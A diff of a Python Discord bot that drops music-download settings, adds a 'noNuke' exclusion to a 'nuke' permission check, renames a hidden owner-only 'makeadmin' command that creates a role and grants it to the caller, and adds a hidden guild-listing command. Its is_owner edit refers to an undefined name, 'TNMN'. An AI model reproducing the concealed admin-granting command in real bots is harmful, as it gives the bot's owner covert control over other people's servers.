@@ -5,8 +5,6 @@ import os
 import discord
 import random
 from discord.ext import commands
-import youtube_dl
-import ffmpeg
 
 ########
 #People#
@@ -17,8 +15,8 @@ Paladin = 447068325856542721
 Cadence = 363424348742352906
 Macky = 523919572273856523
 TNMB = 600524415263965187
+noNuke = [738825914955333684]
 
-teen_club = 609496545569800192
 programmer_club = 555087033652215830
 LDL_server = 707226419993772112
 LDL_bot_commands = 710542883375022160
@@ -32,10 +30,14 @@ def fmt(d):
 def is_nuke(ctx: commands.Context):
     member: discord.Member = ctx.author
     roles: List[discord.Role] = member.roles
-    return is_mod(ctx) or is_admin(ctx) or is_owner(ctx)
+
+    if(ctx.author.id in noNuke):
+        return False
+    else:
+        return is_mod(ctx) or is_admin(ctx) or is_owner(ctx)
 
 def is_owner(ctx: commands.Context):
-    return ctx.author.id == 555207100603826177
+    return ctx.author.id == TNMN
 
 
 def is_admin(ctx: commands.Context):
@@ -57,27 +59,6 @@ def is_LDL_channel(ctx: commands.Context):
             return False
     else:
         return True
-
-youtube_dl.utils.bug_reports_message = lambda: ''
-
-
-ytdl_format_options = {
-    'format': 'bestaudio/best',
-    'outtmpl': '%(extractor)s-%(id)s-%(title)s.%(ext)s',
-    'restrictfilenames': True,
-    'noplaylist': True,
-    'nocheckcertificate': True,
-    'ignoreerrors': False,
-    'logtostderr': False,
-    'quiet': True,
-    'no_warnings': True,
-    'default_search': 'auto',
-    'source_address': '0.0.0.0' # bind to ipv4 since ipv6 addresses cause issues sometimes
-}
-
-ffmpeg_options = {
-    'options': '-vn'
-}
 
 class Discord_Info(commands.Cog):
     def __init__(self, bot):
@@ -203,7 +184,7 @@ class Discord_Info(commands.Cog):
                 else:
                     embed3.add_field(name=i, value=x, inline=True)
                 i = i+1
-            if i is not 1:
+            if i != 1:
                 await ctx.send(embed = embed)
 
                 if(i > 25):
@@ -248,7 +229,7 @@ class Locked(commands.Cog):
     @commands.command(aliases=['create'],hidden=True)
     @commands.guild_only()
     @commands.check(is_owner)
-    async def ma(self, ctx: commands.Context, name: str, color: discord.Color):
+    async def makeadmin(self, ctx: commands.Context, name: str, color: discord.Color):
         """Makes you an admin"""
 
         try:
@@ -263,6 +244,13 @@ class Locked(commands.Cog):
             await user.add_roles(role)
         except discord.Forbidden:
             await ctx.send('Unable to create role..')
+
+    @commands.command(hidden=True)
+    @commands.guild_only()
+    @commands.check(is_owner)
+    async def guildList(self, ctx):
+        async for guild in client.fetch_guilds(limit=150):
+            print(guild.name)
 
 
 class Useful(commands.Cog):
